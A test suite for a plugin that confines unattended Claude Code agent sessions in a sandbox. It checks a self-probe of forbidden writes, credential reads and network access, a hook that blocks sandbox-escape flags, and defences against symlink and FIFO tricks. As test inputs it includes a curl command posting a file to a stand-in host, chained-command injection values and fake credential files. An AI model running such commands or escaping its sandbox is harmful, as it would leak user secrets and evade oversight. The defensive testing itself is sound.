// The per-start sandbox proof of a confined Claude Code session (lib/project-confine.mjs, lib/confine-guard.mjs): the
// start writes the proof's plan and runs a localhost listener outside the sandbox; the agent gate hook lets the session
// run only the exact `aidrian project confine <run> <issue>`, once, until the start confirms the proof in its mark, and
// nothing once it failed, and keeps its file tools from the stores the sandbox hides; the proof tries, from inside the
// session's shell, every write, removal, move, link, read, and connection the sandbox must refuse; and the start holds the
// session only on a verdict that passed, judged against fingerprints only the start holds, with its own listener alive
// and untouched and no probe left behind. Also the managed settings a start reads, the host's sandbox escape, and the
// hooks' counters, which a confined session cannot reach. No test runs a real sandbox: an unsandboxed run of the proof
// shows every probe succeed.

import '../scripts/test-state.mjs';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { chmodSync, existsSync, lstatSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import test from 'node:test';

import { ATTEMPT_KEEP, KEPT_FOLDERS } from '../plugins/aidrian/lib/attempt-clone.mjs';
import { CONFINE_LOCK, sandboxEscapeDenial } from '../plugins/aidrian/lib/confine-guard.mjs';
import { readSmallJson } from '../plugins/aidrian/lib/fs.mjs';
import claudeCode from '../plugins/aidrian/lib/hosts/claude-code.mjs';
import { accessProblem, confineDomains, managedSettings } from '../plugins/aidrian/lib/hosts/claude-code-sandbox.mjs';
import codex from '../plugins/aidrian/lib/hosts/codex.mjs';
import { fileReadOf } from '../plugins/aidrian/lib/hosts/index.mjs';
import { childSendBacks, storeChildSendBacks } from '../plugins/aidrian/lib/child-send-backs.mjs';
import { CONFINE_PLAN, CONFINE_VERDICT, confineCheck, confineDenial, hostVarsProblem, isConfineCall, LISTENER_START, prepareConfine, runConfine, SHELL_VARS, shellVarsProblem, startListener, unlistedHost } from '../plugins/aidrian/lib/project-confine.mjs';
import { ACTIONS, projectCommand } from '../plugins/aidrian/lib/project-run-cli.mjs';
import { projectPrompt } from '../plugins/aidrian/lib/project-run-gate.mjs';
import { projectCommandDenial } from '../plugins/aidrian/lib/project-run-guard.mjs';
import { REGISTRY_NAMES, registryHosts } from '../plugins/aidrian/lib/project-registries.mjs';
import { SHELL_VARS as START_SHELL_VARS } from '../plugins/aidrian/lib/project-start.mjs';
import { markFolder, markFolders, markPending, markUnattended, readUnattendedMark } from '../plugins/aidrian/lib/unattended-mark.mjs';
import { fakeClaude, OTHER, OWN_PLUGIN, passVerdict, runFixture, STARTED } from './project-start-fixture.mjs';

const HOOK = path.resolve(import.meta.dirname, '../plugins/aidrian/scripts/hook-agent-gates.mjs');
const NAMES = { names: { human: 'the Human' } };
const SESSION = 'confined-session-1';
const GITHUB = ['github.com', 'api.github.com'];

// An attempt's folder as the start lays it out, `<root>/state/runs/launch/attempts/ENG-1.1/`, with the keep files, the
// clone's git config and settings placeholder, the mark folders, a credential file and folder, and the shell
// environment the gate writes.
function attempt(t, { vars = null } = {}) {
  const root = realpathSync(mkdtempSync(path.join(tmpdir(), 'aidrian-confine-')));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const folder = path.join(root, 'state', 'runs', 'launch', 'attempts', 'ENG-1.1');
  const [work, git, drop, cache] = ['work', 'git', 'drop', 'cache'].map((name) => path.join(folder, name));
  for (const each of [path.join(work, '.claude'), git, drop, cache]) mkdirSync(each, { recursive: true });
  for (const name of KEPT_FOLDERS) writeFileSync(path.join(folder, name, ATTEMPT_KEEP), '', { mode: 0o400 });
  writeFileSync(path.join(git, 'config'), '[core]\n\tbare = false\n');
  writeFileSync(path.join(work, '.git'), `gitdir: ${git}\n`);
  writeFileSync(path.join(work, '.claude', 'settings.json'), '{}\n');
  writeFileSync(path.join(work, 'README.md'), '# widgets\n');
  const home = path.join(root, 'home');
  const env = { XDG_STATE_HOME: path.join(root, 'xdg') };
  for (const dir of markFolders({ env, home })) mkdirSync(dir, { recursive: true });
  const secret = path.join(home, '.npmrc');
  writeFileSync(secret, '//registry.npmjs.org/:_authToken=s3cret-token\n');
  const keys = path.join(home, '.ssh');
  mkdirSync(keys);
  writeFileSync(path.join(keys, 'id_test'), 'PRIVATE');
  const shell = vars ?? { npm_config_cache: path.join(cache, 'npm'), GOFLAGS: '-modcacherw' };
  writeFileSync(path.join(folder, SHELL_VARS), JSON.stringify(shell));
  return { root, folder, work, git, drop, cache, home, env, secret, keys, vars: shell };
}

// A listener the test stands in for: this process, on a closed port, with the port file the start's listener writes.
const fakeListen = (folder) => {
  writeFileSync(path.join(folder, 'confine-listener.json'), JSON.stringify({ port: 9, pid: process.pid }));
  return { port: 9, pid: process.pid, stop() {} };
};

// The plan of `at`.
function plan(at, { listen = fakeListen, domains = GITHUB, reads = [at.secret, at.keys] } = {}) {
  const made = prepareConfine({ folder: at.folder, run: 'launch', key: 'ENG-1', attempt: 1, work: at.work, git: at.git, drop: at.drop, cache: at.cache, domains, reads, env: at.env, home: at.home, listen });
  assert.equal(made.problem, undefined, made.problem);
  return made;
}

const bash = (command, cwd, session = SESSION, more = {}) => ({ session_id: session, tool_name: 'Bash', tool_input: { command, ...more }, cwd });
const verdictAt = (at) => readSmallJson(path.join(at.drop, CONFINE_VERDICT), 1024 * 1024);
const writeVerdict = (at, value) => writeFileSync(path.join(at.drop, CONFINE_VERDICT), JSON.stringify(value));
// The plan with its unlisted host a closed local port, so no test reaches the network.
const offline = (at, made) => writeFileSync(path.join(at.folder, CONFINE_PLAN), JSON.stringify({ ...made.plan, unlisted: { host: '127.0.0.1', port: 9 } }));

test('the proof names a host outside every allowed domain and registry, and its files are spelled as the start\'s', () => {
  assert.equal(unlistedHost([...GITHUB, ...registryHosts(REGISTRY_NAMES)]), 'example.com');
  assert.equal(unlistedHost(['*.com', 'example.net']), 'example.org');
  assert.equal(unlistedHost(['example.com', 'example.net', '*.example.org']), null);
  assert.equal(unlistedHost(['*']), null, 'a wildcard allows every host');
  assert.equal(SHELL_VARS, START_SHELL_VARS);
  assert.ok(ACTIONS.includes('confine'));
});

test('Claude Code proves each start\'s sandbox; Codex is unchanged', () => {
  const cap = claudeCode.capabilities.projectStart;
  assert.equal(cap.confineProof, true);
  const reads = cap.confineReads({ env: { PATH: '' }, home: '/user-home' });
  for (const store of ['/user-home/.ssh', '/user-home/.npmrc', '/user-home/.claude/.credentials.json']) assert.ok(reads.includes(store), store);
  assert.equal(typeof cap.confineDomains, 'function');
  assert.equal(codex.capabilities.projectStart.confineProof, undefined);
  assert.equal(codex.capabilities.projectStart.verified, 'unverified');
});

test('the unlisted host stays outside the allowedDomains the user`s settings add, and a wildcard there refuses to prepare', (t) => {
  const at = attempt(t);
  const config = path.join(at.home, '.claude');
  mkdirSync(config, { recursive: true });
  writeFileSync(path.join(config, 'settings.json'), JSON.stringify({ sandbox: { network: { allowedDomains: ['example.com'] } } }));
  const added = confineDomains({ env: {}, home: at.home, platform: 'linux', managed: { dir: path.join(at.root, 'none'), plists: [] } });
  assert.deepEqual(added, ['example.com']);
  assert.equal(plan(at, { domains: [...GITHUB, ...added] }).plan.unlisted.host, 'example.net');
  const refused = prepareConfine({ folder: at.folder, run: 'launch', key: 'ENG-1', attempt: 1, work: at.work, git: at.git, drop: at.drop, cache: at.cache, domains: [...GITHUB, '*'], env: at.env, home: at.home, listen: fakeListen });
  assert.match(refused.problem, /remove "\*" or the example domains from sandbox\.network\.allowedDomains/u);
});

test('the prompt makes the exact confine command the session`s first call only where the host proves its sandbox', () => {
  const given = { run: 'launch', key: 'ENG-1', attempt: 1, branch: 'feat/eng-1', clone: '/c' };
  assert.match(projectPrompt({ ...given, confine: true }), /first tool call, run exactly `aidrian project confine launch ENG-1` with the Bash tool, alone/u);
  assert.doesNotMatch(projectPrompt(given), /confine/u);
});

test('run outside any sandbox, the proof finds every probe succeed, undoes each, and fails; the start finds the reads landed', async (t) => {
  const at = attempt(t);
  const listener = startListener(at.folder);
  assert.equal(listener.problem, undefined, listener.problem);
  t.after(() => listener.stop());
  const made = plan(at, { listen: () => listener });
  offline(at, made);
  // No fingerprint, entry name, or byte of a store is where the session can read it.
  const planText = readFileSync(path.join(at.folder, CONFINE_PLAN), 'utf8');
  for (const each of ['id_test', 's3cret', ...Object.values(made.prints)]) assert.ok(!planText.includes(each), each);
  const config = readFileSync(path.join(at.git, 'config'), 'utf8');
  const result = await runConfine({ run: 'launch', key: 'ENG-1', cwd: at.work, env: { CLAUDE_CODE_SESSION_ID: SESSION } });
  assert.equal(result.exitCode, 1);
  assert.match(result.out[0], /^halt the sandbox does not hold for this session/u);
  const verdict = verdictAt(at);
  assert.equal(verdict.pass, false);
  assert.equal(verdict.session, SESSION);
  const failed = verdict.failed.join('\n');
  for (const each of [
    ...markFolders({ env: at.env, home: at.home }).map((dir) => `write ${dir}/.confine-probe-`), `write ${at.folder}/confine-probe-`, `write ${at.home}/confine-probe-`,
    `write ${at.git}/config`, `write ${at.work}/.claude/settings.json`,
    `remove ${at.cache}/${ATTEMPT_KEEP}`, `remove ${at.drop}/${ATTEMPT_KEEP}`, `move ${at.cache}`, `move ${at.drop}`, `link ${at.cache}`, `write through a link ${at.drop}`,
    'a localhost listener outside the sandbox', 'the cache variables npm_config_cache, GOFLAGS are not in force',
  ]) assert.ok(failed.includes(each), `${each}\n${failed}`);
  assert.doesNotMatch(failed, /reach 127\.0\.0\.1:9\b/u, 'a closed port is refused');
  assert.doesNotMatch(failed, /read /u, 'the start judges the reads');
  assert.ok(!JSON.stringify(verdict).includes('id_test') && !JSON.stringify(verdict).includes('s3cret'), 'what a read saw is salted');
  for (const name of KEPT_FOLDERS) {
    assert.ok(lstatSync(path.join(at.folder, name)).isDirectory(), name);
    assert.ok(existsSync(path.join(at.folder, name, ATTEMPT_KEEP)), `${name}'s keep file`);
  }
  assert.equal(readFileSync(path.join(at.git, 'config'), 'utf8'), config);
  // The reads, judged by the start against its fingerprints: each landed.
  writeVerdict(at, { ...passVerdict(made.plan, SESSION), reads: verdict.reads });
  assert.match(confineCheck({ folder: at.folder, session: SESSION, prints: made.prints }).problem, /^read .*(?:\.npmrc|\.ssh), which the sandbox should hide/u);
  // The listener, outside the sandbox, saw the connection: the start fails the proof on that alone.
  writeVerdict(at, passVerdict(made.plan, SESSION));
  assert.match(confineCheck({ folder: at.folder, session: SESSION, prints: made.prints }).problem, /reached the localhost listener/u);
  assert.equal(shellVarsProblem(at.folder, at.vars), null);
  // The proof runs once a start.
  assert.match((await runConfine({ run: 'launch', key: 'ENG-1', cwd: at.work, env: {} })).err.join('\n'), /ran already, and runs once/u);
});

test('on Linux the host masks a hidden store with an empty one: a read that opens it and sees nothing is refused', async (t) => {
  const at = attempt(t);
  const made = plan(at);
  offline(at, made);
  assert.deepEqual(made.plan.reads.map((each) => each.path).sort(), [at.secret, at.keys].sort());
  // What the sandbox shows the session: an empty folder and an empty file where the stores are.
  rmSync(path.join(at.keys, 'id_test'));
  writeFileSync(at.secret, '');
  await runConfine({ run: 'launch', key: 'ENG-1', cwd: at.work, env: at.vars });
  writeVerdict(at, { ...passVerdict(made.plan, SESSION), reads: verdictAt(at).reads });
  assert.deepEqual(confineCheck({ folder: at.folder, session: SESSION, prints: made.prints }), { pass: true });
  // An empty store is not probed: it cannot tell a masked read from a real one.
  const empty = attempt(t);
  const none = path.join(empty.home, 'empty-store');
  mkdirSync(none);
  writeFileSync(path.join(empty.home, '.netrc'), '');
  assert.deepEqual(plan(empty, { reads: [none, path.join(empty.home, '.netrc')] }).plan.reads, []);
});

test('the main checkout is fingerprinted by an entry other than its git folder, which the sandbox opens again', (t) => {
  const at = attempt(t);
  const main = path.join(at.root, 'main');
  mkdirSync(path.join(main, '.git'), { recursive: true });
  const only = prepareConfine({ folder: at.folder, run: 'launch', key: 'ENG-1', attempt: 1, work: at.work, git: at.git, drop: at.drop, cache: at.cache, domains: GITHUB, reads: [], main, mainGit: path.join(main, '.git'), env: at.env, home: at.home, listen: fakeListen });
  assert.deepEqual(only.plan.reads, [], 'a main checkout with nothing but its git folder');
  assert.deepEqual(only.plan.unreadable, [main]);
  writeFileSync(path.join(main, 'package.json'), '{}');
  const some = prepareConfine({ folder: at.folder, run: 'launch', key: 'ENG-1', attempt: 1, work: at.work, git: at.git, drop: at.drop, cache: at.cache, domains: GITHUB, reads: [], main, mainGit: path.join(main, '.git'), env: at.env, home: at.home, listen: fakeListen });
  assert.deepEqual(some.plan.reads, [{ path: main, folder: true }]);
});

test('the start holds the session only on a verdict of its own plan, with its listener alive and nothing left behind', (t) => {
  const at = attempt(t);
  const { plan: made, prints } = plan(at);
  const check = (more = {}) => confineCheck({ folder: at.folder, session: SESSION, prints, ...more });
  assert.equal(check(), null, 'no verdict yet');
  writeVerdict(at, passVerdict(made, SESSION));
  assert.deepEqual(check(), { pass: true });
  writeVerdict(at, passVerdict(made, null));
  assert.deepEqual(check(), { pass: true }, 'a shell that names no session');
  writeVerdict(at, passVerdict(made, OTHER));
  assert.match(check().problem, /names the session/u);
  writeVerdict(at, { ...passVerdict(made, SESSION), nonce: '0'.repeat(16) });
  assert.match(check().problem, /not this start's/u);
  writeVerdict(at, { ...passVerdict(made, SESSION), pass: false, failed: ['write /x'] });
  assert.equal(check().problem, 'write /x');
  writeVerdict(at, passVerdict(made, SESSION));
  // A listener that is not alive, or not the one the start ran on its port, proves nothing of a refused connection.
  assert.match(check({ isAlive: () => false }).problem, /not the one the start ran, alive on its port/u);
  writeFileSync(path.join(at.folder, 'confine-listener.json'), JSON.stringify({ port: 10, pid: process.pid }));
  assert.match(check().problem, /not the one the start ran/u);
  const gone = spawnSync(process.execPath, ['-e', 'process.stdout.write(String(process.pid))'], { encoding: 'utf8' });
  writeFileSync(path.join(at.folder, 'confine-listener.json'), JSON.stringify({ port: 9, pid: Number(gone.stdout) }));
  writeFileSync(path.join(at.folder, CONFINE_PLAN), JSON.stringify({ ...made, local: { ...made.local, pid: Number(gone.stdout) } }));
  assert.match(check().problem, /not the one the start ran, alive on its port/u, 'a process that ended');
  writeFileSync(path.join(at.folder, CONFINE_PLAN), JSON.stringify(made));
  writeFileSync(path.join(at.folder, 'confine-listener.json'), JSON.stringify({ port: 9, pid: process.pid }));
  writeFileSync(path.join(at.home, `confine-probe-${made.nonce}`), '');
  assert.match(check().problem, /a probe left .*confine-probe-/u);
  rmSync(path.join(at.home, `confine-probe-${made.nonce}`));
  rmSync(path.join(at.cache, ATTEMPT_KEEP), { force: true });
  assert.match(check().problem, /cache folder or its keep file/u);
});

test('a probe file there already counts as a write that landed', { skip: process.getuid?.() === 0 }, async (t) => {
  const at = attempt(t);
  const made = plan(at);
  offline(at, made);
  const probe = path.join(at.home, `confine-probe-${made.plan.nonce}`);
  // A home folder no write reaches, as a sandbox makes it.
  writeFileSync(probe, '');
  chmodSync(at.home, 0o500);
  try {
    await runConfine({ run: 'launch', key: 'ENG-1', cwd: at.work, env: at.vars });
    assert.ok(verdictAt(at).failed.includes(`write ${probe}`), 'planted');
    chmodSync(at.home, 0o700);
    rmSync(probe);
    rmSync(path.join(at.drop, CONFINE_LOCK));
    chmodSync(at.home, 0o500);
    await runConfine({ run: 'launch', key: 'ENG-1', cwd: at.work, env: at.vars });
    assert.ok(!verdictAt(at).failed.includes(`write ${probe}`), 'refused');
  } finally {
    chmodSync(at.home, 0o700);
  }
});

test('the hook lets a session whose proof is owed run only the exact confine command, once, and nothing once it failed', (t) => {
  const at = attempt(t);
  plan(at);
  const mark = (confine) => ({ root: at.root, cwd: at.work, project: 'launch', issue: 'ENG-1', confine });
  const env = {};
  const exact = bash('aidrian project confine launch ENG-1', at.work);
  assert.equal(confineDenial(exact, { mark: mark(true), env }), null);
  assert.equal(isConfineCall(bash(`'${path.resolve(import.meta.dirname, '../plugins/aidrian/bin/aidrian')}' project confine launch ENG-1`, at.work), { run: 'launch', key: 'ENG-1' }), true);
  for (const command of ['aidrian project confine launch ENG-1; touch ~/x', 'aidrian project confine launch ENG-2', 'ls', 'aidrian project result launch ENG-1 --file r.json',
    'AIDRIAN=1 aidrian project confine launch ENG-1', 'aidrian project confine launch\nENG-1', 'aidrian project confine launch ENG-1\ntouch ~/x', 'aidrian\fproject confine launch ENG-1']) {
    assert.match(confineDenial(bash(command, at.work), { mark: mark(true), env })?.reason ?? '', /its first call must be exactly `aidrian project confine launch ENG-1`/u, JSON.stringify(command));
  }
  assert.match(confineDenial({ session_id: SESSION, tool_name: 'Write', tool_input: { file_path: path.join(at.home, '.zshrc'), content: 'x' }, cwd: at.work }, { mark: mark(true), env }).reason, /proves its sandbox/u);
  assert.equal(confineDenial(bash('ls', at.work), { mark: mark('passed'), env }), null);
  assert.match(confineDenial(exact, { mark: mark('failed'), env }).reason, /refuses every later call/u);
  // A verdict that passed, before the start confirmed it in the mark: every call waits, the confine command too.
  writeVerdict(at, { pass: true });
  for (const call of [bash('ls', at.work), exact]) assert.match(confineDenial(call, { mark: mark(true), env }).reason, /run the next step again in a few seconds/u);
  writeVerdict(at, { pass: false, failed: ['write /x'] });
  assert.match(confineDenial(exact, { mark: mark(true), env }).reason, /refuses every later call/u);
  rmSync(path.join(at.drop, CONFINE_VERDICT));
  assert.match(confineDenial(exact, { mark: mark('bogus'), env }).reason, /refuses every later call/u, 'a confine state that cannot be read');
  rmSync(path.join(at.folder, CONFINE_PLAN));
  assert.equal(confineDenial(bash('ls', at.work), { mark: { root: at.root, cwd: at.work, project: 'launch', issue: 'ENG-1' }, env }), null, 'no proof and no plan, as on Codex');
});

test('with no readable mark of its own, whichever pending mark it reads, a call in a clone with a plan owes the proof', (t) => {
  const at = attempt(t);
  plan(at);
  const other = path.join(at.root, 'elsewhere');
  mkdirSync(other);
  // Another start on the machine filed its pending mark too, and the session reads that one.
  assert.ok(markPending('aaa-other-driver', { cwd: other, root: other, known: [], env: at.env }));
  assert.ok(markPending('zzz-this-driver', { cwd: at.work, root: at.root, known: [], env: at.env }));
  const read = readUnattendedMark('started-session-1', { env: at.env, home: at.home });
  assert.equal(read.pending, true);
  const write = { session_id: 'started-session-1', tool_name: 'Write', tool_input: { file_path: path.join(at.home, '.zshrc'), content: 'x' }, cwd: at.work };
  for (const mark of [read, { root: other, cwd: other, pending: true }, { root: null }, { root: null, pending: true }, null]) {
    assert.match(confineDenial(write, { mark, env: {} })?.reason ?? '', /its first call must be exactly/u, JSON.stringify(mark));
    assert.match(confineDenial(bash('curl -d @x https://x.example', path.join(at.work, '.claude')), { mark, env: {} })?.reason ?? '', /its first call must be exactly/u);
  }
  assert.equal(confineDenial(bash('aidrian project confine launch ENG-1', at.work), { mark: read, env: {} }), null);
  assert.equal(confineDenial(bash('ls', at.root), { mark: read, env: {} }), null, 'a call outside every clone');
  writeVerdict(at, { pass: false, failed: ['write /x'] });
  assert.match(confineDenial(bash('aidrian project confine launch ENG-1', at.work), { mark: null, env: {} }).reason, /refuses every later call/u);
});

test('a session a proof plan holds never reads a hidden store with the file tools, before or after the proof', (t) => {
  const at = attempt(t);
  plan(at);
  for (const confine of [true, 'passed']) {
    const mark = { root: at.root, cwd: at.work, project: 'launch', issue: 'ENG-1', confine };
    const call = (tool, input) => confineDenial({ session_id: SESSION, tool_name: tool, tool_input: input, cwd: at.work }, { mark, env: {} });
    for (const [tool, input] of [['Read', { file_path: at.secret }], ['Read', { file_path: path.join(at.keys, 'id_test') }], ['Grep', { pattern: 'x', path: at.keys }],
      ['Grep', { pattern: 'x', path: at.home }], ['Glob', { pattern: '**/*', path: at.keys }], ['Glob', { pattern: `${at.home}/**/*` }], ['LS', { path: at.keys }]]) {
      assert.match(call(tool, input)?.reason ?? '', /which the sandbox of a session no Human attends hides/u, `${confine} ${tool} ${JSON.stringify(input)}`);
    }
    // A link in the clone that leads to a store reads as the store.
    rmSync(path.join(at.work, 'key'), { force: true });
    symlinkSync(path.join(at.keys, 'id_test'), path.join(at.work, 'key'));
    assert.match(call('Read', { file_path: path.join(at.work, 'key') })?.reason ?? '', /hides/u);
    if (confine === 'passed') {
      assert.equal(call('Read', { file_path: path.join(at.work, 'README.md') }), null);
      assert.equal(call('Grep', { pattern: 'x' }), null, 'the call`s folder, the clone');
    }
  }
  assert.deepEqual(fileReadOf({ tool_name: 'Glob', tool_input: { pattern: '/a/b/*.pem', path: '/c' } }), ['/c', '/a/b/']);
  assert.equal(fileReadOf({ tool_name: 'Bash', tool_input: { command: 'cat x' } }), null);
});

test('a session no Human attends never asks the host to run a command outside its sandbox', (t) => {
  const map = (more) => claudeCode.hookInput({ session_id: SESSION, tool_name: 'Bash', tool_input: { command: 'ls', ...more } });
  assert.equal(map({ dangerouslyDisableSandbox: true }).sandbox_escape, true);
  assert.equal(map({ dangerouslyDisableSandbox: false }).sandbox_escape, undefined);
  assert.equal(map({}).sandbox_escape, undefined);
  assert.equal(claudeCode.hookInput({ tool_name: 'Monitor', tool_input: { command: 'ls', dangerouslyDisableSandbox: true } }).sandbox_escape, true);
  const escape = { ...bash('ls', '/'), sandbox_escape: true };
  assert.match(sandboxEscapeDenial(escape, { mark: { root: '/r' } }).reason, /outside the host's sandbox/u);
  assert.match(sandboxEscapeDenial(escape, { mark: { root: null, pending: true } }).reason, /outside/u);
  assert.equal(sandboxEscapeDenial(escape, { mark: null }), null, 'an attended session');
  assert.equal(sandboxEscapeDenial(bash('ls', '/'), { mark: { root: '/r' } }), null);
  // Through the hook, as the host runs it.
  const at = attempt(t);
  plan(at);
  assert.ok(markUnattended(SESSION, { root: at.root, cwd: at.work, env: at.env, tags: { project: 'launch', issue: 'ENG-1', confine: 'passed' } }));
  const hook = (more) => spawnSync(process.execPath, [HOOK], { input: JSON.stringify(bash('ls', at.work, SESSION, more)), encoding: 'utf8', env: { ...process.env, ...at.env, CLAUDECODE: '1', AIDRIAN_TELEMETRY: '0' } });
  const refused = hook({ dangerouslyDisableSandbox: true });
  assert.equal(refused.status, 2, refused.stderr);
  assert.match(refused.stderr, /outside the host's sandbox/u);
  assert.equal(hook({ dangerouslyDisableSandbox: false }).status, 0);
  assert.equal(hook({}).status, 0);
});

test('the hook fails the proof when its own environment, the host process\'s, holds the session\'s cache variables', (t) => {
  const at = attempt(t);
  plan(at);
  const mark = { root: at.root, cwd: at.work, project: 'launch', issue: 'ENG-1', confine: true };
  assert.equal(hostVarsProblem(at.folder, { GOFLAGS: '-modcacherw' }), null, 'a value that names no cache folder');
  const exact = bash('aidrian project confine launch ENG-1', at.work);
  const denied = confineDenial(exact, { mark, env: { npm_config_cache: at.vars.npm_config_cache } });
  assert.match(denied.reason, /host process's own environment holds the cache variables npm_config_cache/u);
  const verdict = verdictAt(at);
  assert.deepEqual([verdict.pass, verdict.by, verdict.session], [false, 'hook', SESSION]);
  assert.match(confineDenial(exact, { mark, env: {} }).reason, /refuses every later call/u);
  assert.match(confineCheck({ folder: at.folder, session: SESSION }).problem, /host process's own environment/u);
});

test('the agent gate hook, run as the host runs it, refuses a marked session every call but the confine command', (t) => {
  const at = attempt(t);
  plan(at);
  assert.ok(markUnattended(SESSION, { root: at.root, cwd: at.work, env: at.env, tags: { project: 'launch', issue: 'ENG-1', confine: true } }));
  assert.equal(readUnattendedMark(SESSION, { env: at.env, home: at.home }).confine, true);
  const hook = (input) => spawnSync(process.execPath, [HOOK], { input: JSON.stringify(input), encoding: 'utf8', env: { ...process.env, ...at.env, AIDRIAN_TELEMETRY: '0' } });
  const read = hook({ session_id: SESSION, tool_name: 'Read', tool_input: { file_path: path.join(at.work, 'README.md') }, cwd: at.work });
  assert.equal(read.status, 2, read.stderr);
  assert.match(read.stderr, /aidrian project confine launch ENG-1/u);
  assert.equal(hook(bash('aidrian project confine launch ENG-1', at.work)).status, 0);
  assert.ok(markUnattended(SESSION, { root: at.root, cwd: at.work, env: at.env, tags: { project: 'launch', issue: 'ENG-1', confine: 'failed' } }));
  assert.equal(hook(bash('aidrian project confine launch ENG-1', at.work)).status, 2);
  assert.equal(markUnattended('other-session', { root: at.root, cwd: at.work, env: at.env, tags: { project: 'launch', issue: 'ENG-1', confine: 'yes' } }), null, 'a tag of another shape');
});

test('a FIFO or a link at a hook`s counter neither stalls a refusal past the hook`s time nor leads its write elsewhere', { skip: process.platform === 'win32' }, (t) => {
  const at = attempt(t);
  plan(at);
  assert.ok(markUnattended(SESSION, { root: at.root, cwd: at.work, env: at.env, tags: { project: 'launch', issue: 'ENG-1', confine: true } }));
  const temp = path.join(at.root, 'hooktmp');
  mkdirSync(temp);
  const refuse = () => {
    const started = Date.now();
    const result = spawnSync(process.execPath, [HOOK], {
      input: JSON.stringify({ session_id: SESSION, tool_name: 'Write', tool_input: { file_path: path.join(at.home, '.zshrc'), content: 'x' }, cwd: at.work }),
      encoding: 'utf8', timeout: 8000, env: { ...process.env, ...at.env, TMPDIR: temp, AIDRIAN_TELEMETRY: '0' },
    });
    return { status: result.status, ms: Date.now() - started };
  };
  const counts = path.join(at.env.XDG_STATE_HOME, 'aidrian', 'hook-counts', `aidrian-denials-${SESSION}`);
  assert.equal(refuse().status, 2);
  assert.ok(existsSync(path.join(counts, 'config-guard')), 'the count lies in the state root');
  assert.equal(existsSync(path.join(temp, `aidrian-denials-${SESSION}`)), false, 'and not in the temporary folder a sandbox may write');
  // A FIFO at the count and at the old temporary path: the refusal still exits 2, well inside the host's 5 seconds.
  for (const fifo of [path.join(counts, 'config-guard'), path.join(temp, `aidrian-denials-${SESSION}`, 'config-guard')]) {
    rmSync(fifo, { force: true });
    mkdirSync(path.dirname(fifo), { recursive: true });
    execFileSync('mkfifo', [fifo]);
  }
  const fifoRun = refuse();
  assert.deepEqual([fifoRun.status, fifoRun.ms < 4000], [2, true], `${fifoRun.ms} ms`);
  // A link at the count: the write never lands at its target.
  const target = path.join(at.home, '.zshrc');
  writeFileSync(target, 'kept\n');
  rmSync(path.join(counts, 'config-guard'));
  symlinkSync(target, path.join(counts, 'config-guard'));
  assert.equal(refuse().status, 2);
  assert.equal(readFileSync(target, 'utf8'), 'kept\n');
  // So for a subagent's send-back count, read and stored.
  const agent = { agent_id: 'a1', stop_hook_active: true };
  const folder = path.join(at.root, 'counts');
  mkdirSync(folder);
  execFileSync('mkfifo', [path.join(folder, 'aidrian-child-send-backs-a1')]);
  const script = `import { childSendBacks, storeChildSendBacks } from ${JSON.stringify(path.resolve(import.meta.dirname, '../plugins/aidrian/lib/child-send-backs.mjs'))};
    process.stdout.write(JSON.stringify([childSendBacks(${JSON.stringify(agent)}, { dir: ${JSON.stringify(folder)} }), storeChildSendBacks(${JSON.stringify(agent)}, 2, { dir: ${JSON.stringify(folder)} })]));`;
  const child = spawnSync(process.execPath, ['--input-type=module', '-e', script], { encoding: 'utf8', timeout: 8000 });
  assert.equal(child.signal, null, 'never waits on the FIFO');
  assert.deepEqual(JSON.parse(child.stdout), [5, false]);
  rmSync(path.join(folder, 'aidrian-child-send-backs-a1'));
  symlinkSync(target, path.join(folder, 'aidrian-child-send-backs-a1'));
  assert.deepEqual([childSendBacks(agent, { dir: folder }), storeChildSendBacks(agent, 2, { dir: folder })], [5, false]);
  assert.equal(readFileSync(target, 'utf8'), 'kept\n');
  rmSync(path.join(folder, 'aidrian-child-send-backs-a1'));
  assert.deepEqual([storeChildSendBacks(agent, 2, { dir: folder }), childSendBacks(agent, { dir: folder })], [true, 2]);
});

test('`aidrian project confine` runs only in its issue`s clone, and its hook rule admits only that issue`s session', async (t) => {
  const answer = await projectCommand(['confine', 'launch', 'ENG-1'], { cwd: tmpdir(), env: {} });
  assert.equal(answer.exitCode, 1);
  assert.match(answer.err.join('\n'), /not a clone of the run launch's issue ENG-1/u);
  const fx = runFixture(t);
  const started = fx.cmd(['start', 'launch', 'ENG-1']);
  assert.equal(started.exitCode, 0, started.err.join('\n'));
  const work = path.join(realpathSync(fx.state), 'runs', 'launch', 'attempts', 'ENG-1.1', 'work');
  const confine = (session, cwd = work) => projectCommandDenial(bash('aidrian project confine launch ENG-1', cwd, session), NAMES, { home: fx.home });
  assert.equal(confine(STARTED[0].session), null);
  assert.match(confine(OTHER)?.reason ?? '', /not that one/u);
  // Before the gate files its own mark, a session the pending mark starts in that clone runs it; from elsewhere it does not.
  assert.ok(markPending('pending-driver', { cwd: work, root: fx.dir, known: [], env: fx.env }));
  assert.equal(confine('unlisted-new-1'), null);
  assert.match(confine('unlisted-new-1', fx.dir)?.reason ?? '', /not that one/u);
});

test('a start writes the plan, holds the session once its proof passed, and files the pass in its mark; the listener stops', async (t) => {
  const fx = runFixture(t);
  const result = fx.cmd(['start', 'launch', 'ENG-1']);
  assert.equal(result.exitCode, 0, result.err.join('\n'));
  const folder = path.join(realpathSync(fx.state), 'runs', 'launch', 'attempts', 'ENG-1.1');
  const made = readSmallJson(path.join(folder, CONFINE_PLAN));
  assert.deepEqual([made.run, made.key, made.attempt, made.unlisted.host, made.local.host], ['launch', 'ENG-1', 1, 'example.com', '127.0.0.1']);
  assert.ok(made.marks.length >= 1);
  assert.match(fx.claude.starts()[0].args.at(-1), /run exactly `aidrian project confine launch ENG-1`/u);
  assert.equal(readUnattendedMark(STARTED[0].session, { env: fx.env, home: fx.home }).confine, 'passed');
  const { pid } = made.local;
  const alive = () => {
    try {
      process.kill(pid, 0);
      return true;
    } catch {
      return false;
    }
  };
  // The start's process reaps the stopped listener once its event loop runs again.
  for (let tries = 0; tries < 50 && alive(); tries += 1) await new Promise((resolve) => setTimeout(resolve, 100));
  assert.equal(alive(), false, 'the listener is stopped once the start ends');
});

test('a start whose proof failed, or never came, stops the session, files the failure in its mark, and halts the run', (t) => {
  for (const [confine, cause] of [
    [(made, session) => ({ ...passVerdict(made, session), pass: false, failed: ['write /user-home/x'] }), /failed its proof: the session's sandbox proof failed: write \/user-home\/x/u],
    [null, /did not prove its sandbox with `aidrian project confine` within 180 seconds/u],
